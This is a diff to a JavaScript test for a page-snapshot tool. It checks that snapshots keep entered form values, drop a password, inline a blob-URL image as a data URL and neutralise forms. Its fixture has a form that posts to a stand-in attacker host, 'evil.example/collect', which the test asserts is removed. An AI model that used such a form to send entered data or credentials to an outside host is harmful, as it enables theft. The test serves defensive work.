@@ -607,7 +607,12 @@ document.querySelector("#rows").textContent = rows[0].Name + " " + rows[0].Betra
 test("a snapshot shows the values a person entered, and its forms send nothing", async () => {
   const { page, close } = await open({
     "index.html": `<main><form action="https://evil.example/collect"><input id=name value="initial"><input id=ok type=checkbox>
-<select id=pick><option>a</option><option>b</option></select><textarea id=note>first</textarea><input id=secret type=password></form></main>`,
+<select id=pick><option>a</option><option>b</option></select><textarea id=note>first</textarea><input id=secret type=password></form><img id=photo alt="Photo"></main>`,
+    // An image the app shows from a blob URL, which nothing outside this frame can read.
+    "app.js": `const png = Uint8Array.from(atob("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII="), (c) => c.charCodeAt(0));
+const photo = document.querySelector("#photo");
+photo.src = URL.createObjectURL(new Blob([png], { type: "image/png" }));
+await photo.decode();`,
   });
   try {
     await ready(page);
@@ -622,6 +627,8 @@ test("a snapshot shows the values a person entered, and its forms send nothing",
     expect(snapshot).toMatch(/<option selected="">b<\/option>/);
     expect(snapshot).toContain(">second</textarea>");
     expect(snapshot).not.toContain("hunter2");
+    expect(snapshot).toContain('src="data:image/png;base64,iVBORw0KGgo');
+    expect(snapshot).not.toMatch(/src="blob:/);
     expect(snapshot).not.toContain("evil.example");
     expect(snapshot).toContain("form-action 'none'");
   } finally {
